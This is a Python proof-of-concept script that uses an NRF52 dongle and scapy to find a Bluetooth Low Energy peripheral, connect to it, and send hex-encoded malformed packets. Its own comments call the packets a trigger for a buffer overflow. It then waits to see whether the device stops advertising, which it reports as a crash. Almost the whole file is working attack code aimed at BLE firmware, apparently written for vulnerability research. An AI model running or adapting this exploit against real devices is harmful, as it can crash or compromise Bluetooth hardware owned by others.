#!/usr/bin/python 
import sys
import os
import platform
from time import sleep
from threading import Timer
# libs
sys.path.insert(0,os.getcwd() + '/libs')
import serial
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from scapy.utils import wrpcap

none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False

def send(scapy_pkt, print_tx=True):
	driver.raw_send(raw(scapy_pkt))
	if print_tx:
		print(Fore.CYAN + "TX ---> " + scapy_pkt.summary()[7:])

# Colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
	serial_port = sys.argv[1]
elif platform.system() == 'Linux':
	serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
	serial_port = 'COM1'
else:
	print(Fore.RED + 'Platform not identified')
	sys.exit(0)
print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
	advertiser_address = sys.argv[2].lower()
else:
	advertiser_address = '80:ea:ca:00:00:03'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())

def crash_timeout():
	print(Fore.RED + "No advertisement from " + advertiser_address.upper() + 
		' received\nThe device may have crashed!!!')
	exit(0)

def scan_timeout():
	if not slave_connected:
		scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
				ScanA=master_address,
				AdvA=advertiser_address)
		send(scan_req)

	timeout_scan = Timer(2, scan_timeout)
	timeout_scan.daemon = True
	timeout_scan.start()


# Default addresses
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Open serial port of NRF52
driver = NRF52Dongle(serial_port, '115200')


# Send scan request
scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)
send(scan_req)


timeout = Timer(7.0, crash_timeout)
timeout.daemon = True
timeout.start()

timeout_scan = Timer(2, scan_timeout)
timeout_scan.daemon = True
timeout_scan.start()

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)

#int initial_no = 1
#int final_no = 0

while True:
	pkt = None
	# Receive packet from the NRF52 Dongle
	data = driver.raw_receive()
	if data:
		# Decode Bluetooth Low Energy Data
		pkt = BTLE(data)

		# Check if packet is incorrect
		if pkt is None:
			none_count += 1
			if none_count >= 4:
				print(Fore.RED + 'NRF52 Dongle not detected')
				sys.exit(0)
			continue
		# If the packet is correct and the slave has been connected
		elif slave_connected and BTLE_EMPTY_PDU not in pkt:
		#elif slave_connected:
			# Print slave data channel PDUs summary
			print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])

		# --------------- Process Link Layer Packets here ------------------------------------

		# if packet SCAN_RSP is received from the target
		if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
			timeout.cancel()
			print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
    		# Send connection request
			conn_request = BTLE() / BTLE_ADV(RxAdd=pkt.TxAdd, TxAdd=0) / BTLE_CONNECT_REQ(
            		InitA=master_address,
            		AdvA=advertiser_address,
            		AA=access_address, # Access address (any)
            		crc_init=0x179a9c, # CRC init (any)
            		win_size=2, # 2.5 of windows size (anchor connection window size)
            		win_offset=1, # 1.25ms windows offset (anchor connection point)
            		interval=16,  # 20ms connection interval
            		latency=0, # Slave latency (any)
            		timeout=50, # Supervision timeout, 500ms (any)
            		chM=0x1FFFFFFFFF, # Any
            		hop=5, # Hop increment (any)
            		SCA=0, # Clock tolerance
        	)
			send(conn_request)

		# After sending the CON_REQ, turn to 'connection' state if EMPTY_PDU is received
		elif not slave_connected and BTLE_EMPTY_PDU in pkt:
			slave_connected = True	#The only place to turn to True
			print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')

			#Send Malformed packet to triggger the buffer overflow attack
			
			length_req = BTLE('7083329a020700000400100000874aac'.decode('hex')) # this is a malformed packet(Wrong L2CAP Len)
			#length_req = BTLE('7083329a020703000400100000874aac'.decode('hex'))# this is a malformed packet(0x10 Wrong opcode)
			#length_req = BTLE('7083329a020503000400100000874aac'.decode('hex'))# this is a malformed packet(Wrong LL Len)
			#length_req = BTLE('7083329a020700300400110000874aac'.decode('hex')) # this is a normal packet(Read by group type packet)
			

			send(length_req)	
			send(length_req)
			send(length_req)
			print(Fore.YELLOW + 'Malformed packets were sent')
			end_connection = True	#The only place to turn to True

		# If received a LL_LENGTH_REQ
		elif LL_LENGTH_REQ in pkt:
			length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
			max_tx_bytes=247+4, max_rx_bytes=247+4)
			send(length_rsp) # Send a normal length response

		# End the 'connection' after sending the malformed packet
		elif end_connection == True:
			end_connection = False
			slave_connected = False

			#Send a SCAN_REQ
			scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
			ScanA=master_address,
			AdvA=advertiser_address)
			print(Fore.YELLOW + 'Connection reset')	
			# send(scan_req, print_tx=False)
 			print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
 			send(scan_req)

	sleep(0.01)
